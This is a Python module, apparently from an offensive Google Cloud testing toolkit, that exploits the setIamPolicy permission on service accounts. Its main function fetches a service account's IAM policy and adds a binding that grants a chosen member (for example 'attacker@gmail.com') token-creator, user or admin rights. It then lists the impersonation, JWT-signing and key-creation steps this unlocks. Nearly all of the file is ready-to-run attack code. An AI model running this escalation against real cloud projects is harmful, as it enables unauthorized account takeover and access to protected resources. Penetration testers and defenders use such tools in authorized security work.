"""
GCP Service Account IAM Policy Manipulation Module.

Exploits the iam.serviceAccounts.setIamPolicy permission to:
- Grant yourself impersonation permissions on service accounts
- Add bindings to allow getAccessToken, signJwt, etc.
- Escalate privileges by gaining access to higher-privilege SAs

This is a PRIVILEGE ESCALATION technique - if you can modify a SA's
IAM policy, you can grant yourself permissions to impersonate it.

References:
- https://cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts/setIamPolicy
- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
"""

import json
from typing import Dict, Any, Optional, List, TYPE_CHECKING

import requests
from google.auth.transport.requests import Request  # PERF-008: Move import to module level
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm

from ...utils import parse_error  # DUP-005: Centralized error parsing

if TYPE_CHECKING:
    from ...gcp_session import GCPSessionManager

console = Console()

# IAM Admin API base URL
IAM_API_BASE = "https://iam.googleapis.com/v1"

# Common roles for impersonation
IMPERSONATION_ROLES = {
    "tokenCreator": "roles/iam.serviceAccountTokenCreator",
    "user": "roles/iam.serviceAccountUser",
    "admin": "roles/iam.serviceAccountAdmin",
}


def get_sa_iam_policy(
    session_mgr: "GCPSessionManager",
    service_account_email: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """
    Get the IAM policy for a service account.

    Requires: iam.serviceAccounts.getIamPolicy on the target SA.

    Args:
        session_mgr: GCP session manager with valid credentials
        service_account_email: Target service account email

    Returns:
        IAM policy dictionary, or None on failure
    """
    console.print("\n[bold blue]📋 Get Service Account IAM Policy[/bold blue]\n")

    # Get target SA
    if not service_account_email:
        service_account_email = Prompt.ask(
            "[cyan]Service account email[/cyan]",
            default=""
        )
        if not service_account_email:
            console.print("[red]Service account email is required.[/red]")
            return None

    # Extract project from SA email
    parts = service_account_email.split("@")
    if len(parts) != 2:
        console.print("[red]Invalid service account email format.[/red]")
        return None
    project_id = parts[1].replace(".iam.gserviceaccount.com", "")

    # Get credentials token
    token = session_mgr.get_access_token()  # DUP-004: Use centralized method
    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return None

    # Get IAM policy via API
    resource_name = f"projects/{project_id}/serviceAccounts/{service_account_email}"
    url = f"{IAM_API_BASE}/{resource_name}:getIamPolicy"

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    # Request policy version 3 for full conditional support
    body = {
        "options": {
            "requestedPolicyVersion": 3,
        }
    }

    try:
        response = requests.post(url, headers=headers, json=body, timeout=30)

        if response.status_code == 200:
            policy = response.json()
            _display_iam_policy(service_account_email, policy)
            return policy

        elif response.status_code == 403:
            console.print("[red]Permission denied to get IAM policy.[/red]")
            console.print("[dim]You need iam.serviceAccounts.getIamPolicy on this SA.[/dim]")
            return None

        else:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]API Error ({response.status_code}): {error_msg}[/red]")
            return None

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {e}[/red]")
        return None


def set_sa_iam_policy(
    session_mgr: "GCPSessionManager",
    service_account_email: Optional[str] = None,
    member: Optional[str] = None,
    role: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """
    Add a binding to a service account's IAM policy.

    Requires: iam.serviceAccounts.setIamPolicy on the target SA.

    This is the privilege escalation function - it adds a new binding
    to grant the specified member a role on the SA.

    Args:
        session_mgr: GCP session manager with valid credentials
        service_account_email: Target service account email
        member: Member to add (e.g., serviceAccount:attacker@project.iam.gserviceaccount.com)
        role: Role to grant (default: roles/iam.serviceAccountTokenCreator)

    Returns:
        Updated IAM policy, or None on failure
    """
    console.print("\n[bold blue]⚡ Set Service Account IAM Policy[/bold blue]")
    console.print("[dim]Exploiting: iam.serviceAccounts.setIamPolicy[/dim]\n")

    console.print("[bold yellow]⚠️  WARNING: This modifies IAM policies![/bold yellow]")
    console.print("[dim]This action is logged and may trigger alerts.[/dim]\n")

    # Get target SA
    if not service_account_email:
        service_account_email = Prompt.ask(
            "[cyan]Target service account email[/cyan]",
            default=""
        )
        if not service_account_email:
            console.print("[red]Service account email is required.[/red]")
            return None

    # Extract project from SA email
    parts = service_account_email.split("@")
    if len(parts) != 2:
        console.print("[red]Invalid service account email format.[/red]")
        return None
    project_id = parts[1].replace(".iam.gserviceaccount.com", "")

    # Get member to add
    if not member:
        # Suggest current identity
        current_sa = session_mgr.current_session_data.get("service_account_email")
        default_member = f"serviceAccount:{current_sa}" if current_sa else ""

        console.print("\n[bold]Who should get access?[/bold]")
        console.print("[dim]Examples:[/dim]")
        console.print("[dim]  serviceAccount:my-sa@project.iam.gserviceaccount.com[/dim]")
        console.print("[dim]  user:attacker@gmail.com[/dim]")
        console.print("[dim]  group:team@example.com[/dim]")

        member = Prompt.ask(
            "\n[cyan]Member to add[/cyan]",
            default=default_member
        )
        if not member:
            console.print("[red]Member is required.[/red]")
            return None

    # Validate member format
    if not any(member.startswith(p) for p in ["serviceAccount:", "user:", "group:", "domain:"]):
        console.print("[yellow]Warning: Member should start with serviceAccount:, user:, group:, or domain:[/yellow]")
        if not Confirm.ask("[cyan]Continue anyway?[/cyan]", default=False):
            return None

    # Get role
    if not role:
        console.print("\n[bold]Which role to grant?[/bold]")
        console.print("[dim]1. roles/iam.serviceAccountTokenCreator (impersonate via token)[/dim]")
        console.print("[dim]2. roles/iam.serviceAccountUser (actAs for deployments)[/dim]")
        console.print("[dim]3. roles/iam.serviceAccountAdmin (full control)[/dim]")
        console.print("[dim]4. Custom role[/dim]")

        choice = Prompt.ask(
            "\n[cyan]Select role[/cyan]",
            choices=["1", "2", "3", "4"],
            default="1"
        )

        if choice == "1":
            role = IMPERSONATION_ROLES["tokenCreator"]
        elif choice == "2":
            role = IMPERSONATION_ROLES["user"]
        elif choice == "3":
            role = IMPERSONATION_ROLES["admin"]
        else:
            role = Prompt.ask("[cyan]Custom role[/cyan]", default="")
            if not role:
                console.print("[red]Role is required.[/red]")
                return None

    console.print(f"\n[dim]Target SA: {service_account_email}[/dim]")
    console.print(f"[dim]Member: {member}[/dim]")
    console.print(f"[dim]Role: {role}[/dim]")

    # Confirm
    if not Confirm.ask("\n[yellow]Proceed with IAM policy modification?[/yellow]", default=False):
        console.print("[dim]Cancelled.[/dim]")
        return None

    # Get credentials token
    token = session_mgr.get_access_token()  # DUP-004: Use centralized method
    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return None

    # First, get current policy
    console.print("\n[cyan]Fetching current IAM policy...[/cyan]")

    resource_name = f"projects/{project_id}/serviceAccounts/{service_account_email}"
    get_url = f"{IAM_API_BASE}/{resource_name}:getIamPolicy"

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    get_body = {
        "options": {
            "requestedPolicyVersion": 3,
        }
    }

    try:
        response = requests.post(get_url, headers=headers, json=get_body, timeout=30)

        if response.status_code == 200:
            current_policy = response.json()
        elif response.status_code == 403:
            console.print("[red]Permission denied to get IAM policy.[/red]")
            return None
        else:
            # Assume empty policy if we can't read it
            current_policy = {"bindings": [], "version": 1}

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {e}[/red]")
        return None

    # Modify the policy - add or update binding
    bindings = current_policy.get("bindings", [])
    etag = current_policy.get("etag", "")
    version = current_policy.get("version", 1)

    # Check if binding already exists
    role_binding = None
    for binding in bindings:
        if binding.get("role") == role:
            role_binding = binding
            break

    if role_binding:
        # Add member to existing binding
        if member not in role_binding.get("members", []):
            role_binding.setdefault("members", []).append(member)
            console.print(f"[dim]Added {member} to existing {role} binding[/dim]")
        else:
            console.print(f"[yellow]Member {member} already has {role}[/yellow]")
            return current_policy
    else:
        # Create new binding
        bindings.append({
            "role": role,
            "members": [member],
        })
        console.print(f"[dim]Created new binding for {role}[/dim]")

    # Set the new policy
    console.print("[cyan]Setting new IAM policy...[/cyan]")

    set_url = f"{IAM_API_BASE}/{resource_name}:setIamPolicy"

    new_policy = {
        "bindings": bindings,
        "version": max(version, 3),  # Use policy version 3
    }
    if etag:
        new_policy["etag"] = etag

    set_body = {
        "policy": new_policy,
    }

    try:
        response = requests.post(set_url, headers=headers, json=set_body, timeout=30)

        if response.status_code == 200:
            updated_policy = response.json()

            console.print(f"\n[bold green]✅ IAM policy updated successfully![/bold green]")
            console.print(f"  [green]Member:[/green] {member}")
            console.print(f"  [green]Role:[/green] {role}")
            console.print(f"  [green]Target SA:[/green] {service_account_email}")

            # Show what this enables
            console.print("\n[bold yellow]📋 What you can now do:[/bold yellow]")
            if role == IMPERSONATION_ROLES["tokenCreator"]:
                console.print(f"[dim]  - Get access tokens: impersonate {service_account_email}[/dim]")
                console.print(f"[dim]  - Sign JWTs: sign_jwt {service_account_email}[/dim]")
                console.print(f"[dim]  - Sign blobs: sign_blob {service_account_email}[/dim]")
            elif role == IMPERSONATION_ROLES["user"]:
                console.print(f"[dim]  - Use SA for deployments (actAs)[/dim]")
                console.print(f"[dim]  - Attach SA to resources[/dim]")
            elif role == IMPERSONATION_ROLES["admin"]:
                console.print(f"[dim]  - Full control over SA[/dim]")
                console.print(f"[dim]  - Create/delete keys[/dim]")
                console.print(f"[dim]  - Modify IAM policies[/dim]")

            # Save to session
            session_mgr.save_enumeration_data(f"iam_policy_modified_{service_account_email.split('@')[0]}", {
                "target_sa": service_account_email,
                "member_added": member,
                "role_granted": role,
                "previous_policy": current_policy,
                "new_policy": updated_policy,
            })

            return updated_policy

        elif response.status_code == 403:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]Permission denied: {error_msg}[/red]")
            console.print("[dim]You need iam.serviceAccounts.setIamPolicy on this SA.[/dim]")
            return None

        elif response.status_code == 409:
            console.print("[red]Conflict - policy was modified by another process.[/red]")
            console.print("[dim]Try again to get the latest policy.[/dim]")
            return None

        else:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]API Error ({response.status_code}): {error_msg}[/red]")
            return None

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {e}[/red]")
        return None


def remove_sa_iam_binding(
    session_mgr: "GCPSessionManager",
    service_account_email: Optional[str] = None,
    member: Optional[str] = None,
    role: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """
    Remove a binding from a service account's IAM policy.

    Requires: iam.serviceAccounts.setIamPolicy on the target SA.

    Args:
        session_mgr: GCP session manager with valid credentials
        service_account_email: Target service account email
        member: Member to remove
        role: Role to remove from

    Returns:
        Updated IAM policy, or None on failure
    """
    console.print("\n[bold blue]🗑️  Remove Service Account IAM Binding[/bold blue]\n")

    # Get target SA
    if not service_account_email:
        service_account_email = Prompt.ask(
            "[cyan]Service account email[/cyan]",
            default=""
        )
        if not service_account_email:
            console.print("[red]Service account email is required.[/red]")
            return None

    # Extract project from SA email
    parts = service_account_email.split("@")
    if len(parts) != 2:
        console.print("[red]Invalid service account email format.[/red]")
        return None
    project_id = parts[1].replace(".iam.gserviceaccount.com", "")

    # Get member
    if not member:
        member = Prompt.ask("[cyan]Member to remove[/cyan]", default="")
        if not member:
            console.print("[red]Member is required.[/red]")
            return None

    # Get role
    if not role:
        role = Prompt.ask(
            "[cyan]Role to remove from[/cyan]",
            default="roles/iam.serviceAccountTokenCreator"
        )

    console.print(f"\n[dim]Target SA: {service_account_email}[/dim]")
    console.print(f"[dim]Member: {member}[/dim]")
    console.print(f"[dim]Role: {role}[/dim]")

    # Confirm
    if not Confirm.ask("\n[yellow]Remove this binding?[/yellow]", default=False):
        console.print("[dim]Cancelled.[/dim]")
        return None

    # Get credentials token
    token = session_mgr.get_access_token()  # DUP-004: Use centralized method
    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return None

    # First, get current policy
    resource_name = f"projects/{project_id}/serviceAccounts/{service_account_email}"
    get_url = f"{IAM_API_BASE}/{resource_name}:getIamPolicy"

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    try:
        response = requests.post(get_url, headers=headers, json={"options": {"requestedPolicyVersion": 3}}, timeout=30)

        if response.status_code != 200:
            console.print("[red]Failed to get current IAM policy.[/red]")
            return None

        current_policy = response.json()

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {e}[/red]")
        return None

    # Modify the policy - remove member from binding
    bindings = current_policy.get("bindings", [])
    etag = current_policy.get("etag", "")
    version = current_policy.get("version", 1)

    removed = False
    new_bindings = []
    for binding in bindings:
        if binding.get("role") == role:
            members = binding.get("members", [])
            if member in members:
                members.remove(member)
                removed = True
            # Only keep binding if it still has members
            if members:
                binding["members"] = members
                new_bindings.append(binding)
        else:
            new_bindings.append(binding)

    if not removed:
        console.print(f"[yellow]Member {member} not found in {role} binding.[/yellow]")
        return current_policy

    # Set the new policy
    set_url = f"{IAM_API_BASE}/{resource_name}:setIamPolicy"

    new_policy = {
        "bindings": new_bindings,
        "version": version,
    }
    if etag:
        new_policy["etag"] = etag

    try:
        response = requests.post(set_url, headers=headers, json={"policy": new_policy}, timeout=30)

        if response.status_code == 200:
            console.print(f"[green]✅ Removed {member} from {role}[/green]")
            return response.json()
        else:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]API Error ({response.status_code}): {error_msg}[/red]")
            return None

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {e}[/red]")
        return None


def _display_iam_policy(service_account_email: str, policy: Dict[str, Any]) -> None:
    """Display IAM policy in a formatted table."""
    bindings = policy.get("bindings", [])

    if not bindings:
        console.print(f"[yellow]No IAM bindings found for {service_account_email}[/yellow]")
        return

    table = Table(title=f"IAM Policy - {service_account_email}")
    table.add_column("Role", style="cyan", overflow="fold", no_wrap=False)
    table.add_column("Members", style="white", overflow="fold", no_wrap=False)

    for binding in bindings:
        role = binding.get("role", "unknown")
        members = binding.get("members", [])

        # Highlight dangerous roles
        if any(r in role for r in ["TokenCreator", "serviceAccountUser", "Admin", "owner", "editor"]):
            role = f"[yellow]{role}[/yellow]"

        # Format members
        member_strs = []
        for m in members:
            if m in ["allUsers", "allAuthenticatedUsers"]:
                member_strs.append(f"[red]{m} (PUBLIC!)[/red]")
            elif m.startswith("serviceAccount:"):
                member_strs.append(f"[cyan]{m}[/cyan]")
            else:
                member_strs.append(m)

        table.add_row(role, "\n".join(member_strs))

    console.print(table)
